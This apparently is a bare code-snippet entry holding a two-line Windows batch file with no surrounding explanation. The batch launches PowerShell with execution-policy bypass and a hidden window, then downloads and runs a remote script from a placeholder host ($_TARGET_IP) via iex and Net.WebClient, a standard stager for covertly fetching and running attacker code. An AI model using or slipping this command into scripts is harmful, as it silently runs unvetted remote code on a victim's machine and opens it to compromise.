---
id: 9ba0506e-b20c-4741-8097-0402d7b9e0a0
type: code
language: ''
verified: false
created_at: '2020-04-04T01:00:19.716167+00:00'
updated_at: '2023-05-29T16:48:53.365139+00:00'
---

# Code Snippet 9ba0506e

```
@ECHO OFF
powershell.exe -ep bypass -noprofile -windowstyle hidden "iex(New-Object Net.WebClient).downloadString('http://$_TARGET_IP/$_FILENAME.ps1')"
```


